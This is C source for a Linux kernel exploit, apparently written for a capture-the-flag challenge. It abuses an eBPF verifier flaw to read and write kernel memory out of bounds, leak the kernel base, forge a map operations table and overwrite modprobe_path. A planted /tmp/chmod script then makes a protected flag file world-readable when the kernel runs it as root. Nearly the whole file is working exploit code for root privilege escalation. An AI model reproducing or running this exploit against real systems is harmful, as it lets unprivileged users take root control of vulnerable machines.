#define _GNU_SOURCE
#include <linux/bpf_common.h>
#include <assert.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <malloc.h>
#include <netinet/in.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/xattr.h>
#include <unistd.h>
#include "bpf_insn.h"

#define PAGE_SIZE 4096

#define HELLO_MSG "I am Lime, let me in!"
#define MSG_LEN 28

void die(const char *msg)
{
    perror(msg);
    exit(-1);
}

int global_fd;
int control_map, read_map;

int _bpf(int cmd, union bpf_attr *attr, uint32_t size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}

int create_map(int value_size, int cnt)
{
    int map_fd;
    union bpf_attr attr = {.map_type = BPF_MAP_TYPE_ARRAY,
                           .key_size = 4,
                           .value_size = value_size,
                           .max_entries = cnt};

    map_fd = _bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
    if (map_fd < 0)
    {
        die("[!] Error creating map");
    }
    printf("[+] created map: %d\n\tvalue size: %d\n\tcnt: %d\n", map_fd,
           value_size, cnt);
    return map_fd;
}

int prog_load(struct bpf_insn *prog, int insn_cnt)
{
    int prog_fd;
    char log_buf[0xf000];
    union bpf_attr attr = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insn_cnt = insn_cnt,
        .insns = (uint64_t)prog,
        .license = (uint64_t) "GPL",
        .log_level = 2,
        .log_size = sizeof(log_buf),
        .log_buf = (uint64_t)log_buf,
    };

    prog_fd = _bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
    printf("[+] log_buf: \n%s\nLOG_END\n", log_buf);
    if (prog_fd < 0)
    {
        die("[!] Failed to load BPF prog!");
    }
    return prog_fd;
}

int update_item(int fd, int idx, uint64_t value)
{
    union bpf_attr attr = {
        .map_fd = fd,
        .key = (uint64_t)&idx,
        .value = (uint64_t)&value,
        .flags = BPF_ANY,
    };
    // printf("[+] update_item;\n\tmap_fd: %d\n\tidx: 0x%x\n\tvalue: 0x%lx\n", fd,
    // idx, value);
    return _bpf(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

uint64_t get_item(int fd, uint64_t idx)
{
    char value[0x800];
    uint64_t index = idx;
    union bpf_attr *attr = calloc(1, sizeof(union bpf_attr));
    attr->map_fd = fd;
    attr->key = (uint64_t)&idx;
    attr->value = (uint64_t)value;

    if (_bpf(BPF_MAP_LOOKUP_ELEM, attr, sizeof(*attr)) < 0)
    {
        die("[!] Failed to lookup");
    }

    return *(uint64_t *)value;
}

uint64_t leak_kernel()
{
    int leak_fd;
    struct bpf_insn prog[] = {
        BPF_LD_MAP_FD(BPF_REG_1, read_map),      // r1 = map_fd
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),    // r2 = rbp
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),   // r2 = fp -8
        BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),     // key = [r2] = 0;
        BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // r0 = lookup_elem
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),    // jmp if r0!=0
        BPF_EXIT_INSN(),                         // else exit
        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),      // r8 = &rmap[0]

        BPF_LD_IMM64(BPF_REG_4,0x110),//4 
        BPF_MOV64_IMM(BPF_REG_1,64),
        BPF_ALU64_REG(BPF_RSH, BPF_REG_4,BPF_REG_1),

        BPF_MOV64_REG(BPF_REG_5,BPF_REG_8), //r5=r8 =&rmap[0]
        BPF_ALU64_REG(BPF_SUB,BPF_REG_5,BPF_REG_4), //r5=&rmap[0]-0x110


        BPF_LDX_MEM(BPF_DW,BPF_REG_9,BPF_REG_5,0),


        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_9, 0),
        BPF_MOV64_IMM(BPF_REG_0,0),
        BPF_EXIT_INSN(),

    };
    int insn_cnt = sizeof(prog) / sizeof(struct bpf_insn);
    // printf("[+] insn_cnt = %d\n", insn_cnt);
    leak_fd = prog_load(prog, insn_cnt);
    printf("[+] leak_fd = %d\n", leak_fd);
    int sockets[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets) < 0)
    {
        die("[!] Failed in socketpair");
    }

    if (setsockopt(sockets[0], SOL_SOCKET, SO_ATTACH_BPF, &leak_fd,
                   sizeof(leak_fd)) < 0)
    {
        die("[!] Failed to attach BPF");
    }
    puts("[+] leak ATTACH_BPF");

    if (send(sockets[1], HELLO_MSG, MSG_LEN, 0) < 0)
    {
        die("[!] Failed to send HELLO_MSG");
    }
    uint64_t leak = get_item(read_map, 0);
    printf("[+] leak:0x%lx\n", leak);
    return leak;
}
void gen_fake_elf(){
    system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag\n' > /tmp/chmod");
    system("chmod +x /tmp/chmod");
    system("echo -ne '\xff\xff\xff\xff' > /tmp/fake");
    system("chmod +x /tmp/fake");
}
uint64_t kernel_base,modprobe_path;

void init_addr(uint64_t kernel_base){
    modprobe_path=0xa35ea0+kernel_base;
}
uint64_t overwrite = 0x782f706d7420;



uint64_t leak_map_element(uint32_t modprobe_path_low32,uint32_t modprobe_path_high32)
{
    int leak_fd;
    struct bpf_insn prog[] = {
        BPF_LD_MAP_FD(BPF_REG_1, read_map),      // r1 = map_fd
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),    // r2 = rbp
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),   // r2 = fp -8
        BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),     // key = [r2] = 0;
        BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // r0 = lookup_elem
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),    // jmp if r0!=0
        BPF_EXIT_INSN(),                         // else exit

        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),      // r8 = &rmap[0]
        BPF_MOV64_REG(BPF_REG_5, BPF_REG_8),
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_5),
        BPF_LD_IMM64(BPF_REG_4,0x110-0xc0),//4 
        BPF_MOV64_IMM(BPF_REG_1,64),
        BPF_ALU64_REG(BPF_RSH, BPF_REG_4,BPF_REG_1),

        // BPF_LD_IMM64(BPF_REG_3,overwrite),
        // BPF_MOV64_REG(BPF_REG_5, BPF_REG_8),//r5=r8 =&rmap[0]
        // BPF_ALU64_REG(BPF_ADD, BPF_REG_5, BPF_REG_4),
        BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_4),
        BPF_LDX_MEM(BPF_DW, BPF_REG_0,BPF_REG_8, 0), 
        BPF_STX_MEM(BPF_DW, BPF_REG_7,BPF_REG_0, 0), //write_list
        BPF_MOV64_IMM(BPF_REG_0,0),
        BPF_EXIT_INSN(), 

    };
    int insn_cnt = sizeof(prog) / sizeof(struct bpf_insn);
    // printf("[+] insn_cnt = %d\n", insn_cnt);
    leak_fd = prog_load(prog, insn_cnt);
    int sockets[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets) < 0)
    {
        die("[!] Failed in socketpair");
    }

    if (setsockopt(sockets[0], SOL_SOCKET, SO_ATTACH_BPF, &leak_fd,
                   sizeof(leak_fd)) < 0)
    {
        die("[!] Failed to attach BPF");
    }
    puts("[+] leak ATTACH_BPF");

    if (send(sockets[1], HELLO_MSG, MSG_LEN, 0) < 0)
    {
        die("[!] Failed to send HELLO_MSG");
    }
    uint64_t leak = get_item(read_map, 0);
    printf("[+] leak:0x%lx\n", leak);   
    return leak;
}
static int bpf_update_elem(int fd ,void *key, void *value,uint64_t flags){
    union bpf_attr attr = {                                              
        .map_fd = fd,                                                
        .key = (uint64_t)key,                                        
        .value = (uint64_t)value,                                    
        .flags = flags,                                              
    };                                                                   
    return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));  

}
uint64_t pwn(uint32_t modprobe_path_low32,uint32_t modprobe_path_high32,uint64_t map_element)
{
    int leak_fd;
    struct bpf_insn prog[] = {
        BPF_LD_MAP_FD(BPF_REG_1, read_map),      // r1 = map_fd
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),    // r2 = rbp
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),   // r2 = fp -8
        BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),     // key = [r2] = 0;
        BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // r0 = lookup_elem
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),    // jmp if r0!=0
        BPF_EXIT_INSN(),                         // else exit

        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),      // r8 = &rmap[0]
        BPF_MOV64_REG(BPF_REG_5, BPF_REG_8),
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_5),
        BPF_LD_IMM64(BPF_REG_4,0x110),//4 
        BPF_MOV64_IMM(BPF_REG_1,64),
        BPF_ALU64_REG(BPF_RSH, BPF_REG_4,BPF_REG_1),

        // BPF_LD_IMM64(BPF_REG_3,overwrite),
        // BPF_MOV64_REG(BPF_REG_5, BPF_REG_8),//r5=r8 =&rmap[0]
        // BPF_ALU64_REG(BPF_ADD, BPF_REG_5, BPF_REG_4),
        BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_4),
        BPF_LD_IMM64(BPF_REG_0,map_element),
        //BPF_LDX_MEM(BPF_DW, BPF_REG_0,BPF_REG_8, 0),//r0=write_list=self
        //BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_4),
        BPF_STX_MEM(BPF_DW, BPF_REG_8,BPF_REG_0, 0), //write_list
        BPF_ST_MEM(BPF_W, BPF_REG_8,0x18, 23), //write_list
        BPF_ST_MEM(BPF_W, BPF_REG_8,0x24, 0xffffffff), //write_list
        BPF_ST_MEM(BPF_W, BPF_REG_8,0x2c, 0), //write_list
        // BPF_LD_IMM64(BPF_REG_4,0x110-0x18),//4 
        // BPF_MOV64_IMM(BPF_REG_1,64),
        // BPF_ALU64_REG(BPF_RSH, BPF_REG_4,BPF_REG_1),
        // BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_4),
        // BPF_LD_IMM64(BPF_REG_0,23),
        // BPF_STX_MEM(BPF_DW, BPF_REG_8,BPF_REG_0, 0), //map_type
        
        // BPF_LD_IMM64(BPF_REG_4,0x110-0x24),//4 
        // BPF_MOV64_IMM(BPF_REG_1,64),
        // BPF_ALU64_REG(BPF_RSH, BPF_REG_4,BPF_REG_1),
        // BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_4),
        // BPF_LD_IMM64(BPF_REG_0,-1),
        // BPF_STX_MEM(BPF_DW, BPF_REG_8,BPF_REG_0, 0), //entry
        // BPF_LD_IMM64(BPF_REG_4,0x110-0x2c),//4 
        // BPF_MOV64_IMM(BPF_REG_1,64),
        // BPF_ALU64_REG(BPF_RSH, BPF_REG_4,BPF_REG_1),
        // BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_4),
        // BPF_LD_IMM64(BPF_REG_0,0),
        // BPF_STX_MEM(BPF_DW, BPF_REG_8,BPF_REG_0, 0), //spin

        BPF_MOV64_IMM(BPF_REG_0,0),
        BPF_EXIT_INSN(), 
    };
    int insn_cnt = sizeof(prog) / sizeof(struct bpf_insn);
    // printf("[+] insn_cnt = %d\n", insn_cnt);
    leak_fd = prog_load(prog, insn_cnt);
    int sockets[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets) < 0)
    {
        die("[!] Failed in socketpair");
    }

    if (setsockopt(sockets[0], SOL_SOCKET, SO_ATTACH_BPF, &leak_fd,
                   sizeof(leak_fd)) < 0)
    {
        die("[!] Failed to attach BPF");
    }
    puts("[+] leak ATTACH_BPF");

    if (send(sockets[1], HELLO_MSG, MSG_LEN, 0) < 0)
    {
        die("[!] Failed to send HELLO_MSG");
    }
    return 0;
}

int main()
{
    gen_fake_elf();
    read_map = create_map(0x700, 1);
    update_item(read_map, 0, 0xdeadbeef);
    uint64_t leak = leak_kernel(); //! wrong
    kernel_base=leak-0x10363a0;//0x1a6c240 0xa35ea0
    init_addr(leak);
    printf("modprobe_path_high32: %#llx\nmodprobe_path_low32: %#llx\n",(modprobe_path)&0xffffffff,(modprobe_path>>32)&0xfffffff);
    printf("[+] leak:0x%lx\n", leak);
    printf("[+] kernel_base:0x%lx\n", kernel_base);
    printf("[+] modprobe_path:0x%lx\n", modprobe_path);
    uint64_t map_element=leak_map_element((modprobe_path)&0xffffffff,(modprobe_path>>32)&0xfffffff)-0xc0+0x110;
    printf("[+] map_element:0x%lx\n", map_element);

    uint64_t fake_map_ops[]={
        kernel_base +0xffffffff8120e400-0xffffffff81000000,
        kernel_base +0xffffffff8120f850-0xffffffff81000000,
        0x0,
        kernel_base +0xffffffff8120ee40-0xffffffff81000000,
        kernel_base +0xffffffff8120e500-0xffffffff81000000,//get net key 5
        0x0,
        0x0,
        kernel_base +0xffffffff811f0370-0xffffffff81000000,
        0x0,
        kernel_base +0xffffffff811f0140-0xffffffff81000000,
        0x0,
        kernel_base +0xffffffff8120e680-0xffffffff81000000,
        kernel_base +0xffffffff8120ed00-0xffffffff81000000,
        kernel_base +0xffffffff8120e540-0xffffffff81000000,
        kernel_base +0xffffffff8120e500-0xffffffff81000000,//map_push_elem 15
        0x0,
        0x0,
        0x0,
        0x0,
        kernel_base +0xffffffff8120e740-0xffffffff81000000,
        0x0,
        kernel_base +0xffffffff8120eb00-0xffffffff81000000,
        kernel_base +0xffffffff8120f520-0xffffffff81000000,
        0x0,
        0x0,
        0x0,
        kernel_base +0xffffffff8120e490-0xffffffff81000000,
        kernel_base +0xffffffff8120e4c0-0xffffffff81000000,
        kernel_base +0xffffffff8120ea90-0xffffffff81000000,
    };
    char *expbuf  = malloc(0x3000);
    uint64_t *expbuf64  = (uint64_t *)expbuf;
    memcpy(expbuf,(void *)fake_map_ops,sizeof(fake_map_ops));
    uint32_t key=0;
    bpf_update_elem(read_map, &key, expbuf,0);
    pwn((modprobe_path)&0xffffffff,(modprobe_path>>32)&0xfffffff,(void *)map_element);
    expbuf64[0] = 0x706d742f -1;                              
    bpf_update_elem(read_map,&key,expbuf,modprobe_path);      
    expbuf64[0] = 0x6d68632f -1;                              
    bpf_update_elem(read_map,&key,expbuf,modprobe_path+4);    
    expbuf64[0] = 0x646f -1;                                  
    bpf_update_elem(read_map,&key,expbuf,modprobe_path+8);
    
    // system("/tmp/chmod");
    // system("cat /flag");
}